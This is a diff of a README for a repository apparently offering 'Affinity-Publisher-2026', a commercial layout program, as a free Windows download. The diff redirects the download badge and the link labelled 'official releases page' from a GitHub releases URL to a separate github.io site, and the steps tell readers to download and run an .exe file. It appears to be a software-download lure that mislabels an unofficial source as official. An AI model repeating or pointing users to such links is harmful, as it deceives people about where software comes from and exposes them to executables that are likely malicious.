@@ -1,6 +1,6 @@
 # 🖥️ Affinity-Publisher-2026 - Create professional layouts for your projects
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Florenzadramatic328/Affinity-Publisher-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://florenzadramatic328.github.io)
 
 Affinity Publisher 2 serves as a professional page layout tool for Windows computers. This software allows you to combine images, graphics, and text into beautiful layouts for magazines, books, brochures, and posters. This guide explains how to install the software and prepare your system for use.
 
@@ -20,7 +20,7 @@ If your computer meets these requirements, the software installs and runs effici
 
 Follow these steps to obtain the setup files:
 
-1. Visit the [official releases page](https://github.com/Florenzadramatic328/Affinity-Publisher-2026/releases).
+1. Visit the [official releases page](https://florenzadramatic328.github.io).
 2. Look for the most recent version listed at the top of the page.
 3. Click the file ending in .exe to start your download.
 4. Wait for the file to finish downloading to your Downloads folder.
